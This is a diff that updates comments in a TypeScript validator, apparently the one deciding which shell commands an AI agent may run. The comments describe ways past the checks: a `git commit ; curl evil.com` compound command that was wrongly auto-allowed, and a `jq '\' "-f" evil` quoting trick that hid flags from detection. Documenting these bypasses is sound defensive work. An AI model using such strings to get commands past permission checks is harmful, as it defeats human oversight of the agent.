@@ -630,8 +630,11 @@ function validateGitCommit(context: ValidationContext): PermissionResult {
   // `.*?` matched anything except `\n`, including `;`, `&`, `|`, `` ` ``, `$(`.
   // For `git commit ; curl evil.com -m 'x'`, `.*?` swallowed `; curl evil.com `
   // leaving remainder=`` (falsy → remainder check skipped) → returned `allow`
-  // for a compound command. Early-allow skips ALL main validators (line ~1908),
-  // nullifying validateQuotedNewline, validateBackslashEscapedOperators, etc.
+  // for a compound command. An early `allow` returns straight out of the
+  // `const earlyValidators = [` loop — note there are TWO, one in each
+  // bashCommandIsSafe*_DEPRECATED entry point — so the main validator list
+  // that follows it never runs at all, nullifying validateQuotedNewline,
+  // validateBackslashEscapedOperators, etc.
   // While splitCommand currently catches this downstream, early-allow is a
   // POSITIVE ASSERTION that the FULL command is safe — which it is NOT.
   //
@@ -1290,12 +1293,16 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     // `\` inside `'...'` is LITERAL. Without this guard, `'\'` desyncs the
     // quote tracker: `\` sets escaped=true, closing `'` is consumed by the
     // escaped-skip above instead of toggling inSingleQuote. Parser stays in
-    // single-quote mode, and the `if (inSingleQuote || inDoubleQuote) continue`
-    // at line ~1121 skips ALL subsequent flag detection for the rest of the
-    // command. Example: `jq '\' "-f" evil` — bash gets `-f` arg, but desynced
-    // parser thinks ` "-f" evil` is inside quotes → flag detection bypassed.
-    // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns at
-    // line ~1856 before this runs. But we fix the tracker for consistency with
+    // single-quote mode, and the `if (inSingleQuote || inDoubleQuote) {`
+    // guard further down this same loop skips ALL subsequent flag detection
+    // for the rest of the command. Example: `jq '\' "-f" evil` — bash gets
+    // `-f` arg, but desynced parser thinks ` "-f" evil` is inside quotes →
+    // flag detection bypassed.
+    // Defense-in-depth: hasShellQuoteSingleQuoteBug (imported from
+    // utils/bash/shellQuote.js) catches `'\'` patterns in both
+    // bashCommandIsSafe*_DEPRECATED entry points, before the validator list
+    // containing this validateObfuscatedFlags ever runs. But we fix the
+    // tracker for consistency with
     // the CORRECT implementations elsewhere in this file (hasBackslashEscaped*,
     // extractQuotedContent) which all guard with `!inSingleQuote`.
     if (currentChar === '\\' && !inSingleQuote) {
@@ -1681,8 +1688,8 @@ function hasBackslashEscapedOperator(command: string): boolean {
       // is flagged (the unpaired `\` before `;` is detected). Even-count `\\;`
       // (2, 4...) is NOT flagged, which is CORRECT — bash treats `\\` as
       // literal `\` and `;` as a separator, so splitCommand handles it
-      // normally (no double-parse bug). This matches
-      // hasBackslashEscapedWhitespace line ~1340.
+      // normally (no double-parse bug). This matches the parity handling in
+      // hasBackslashEscapedWhitespace, declared above in this file.
       i++
       continue
     }
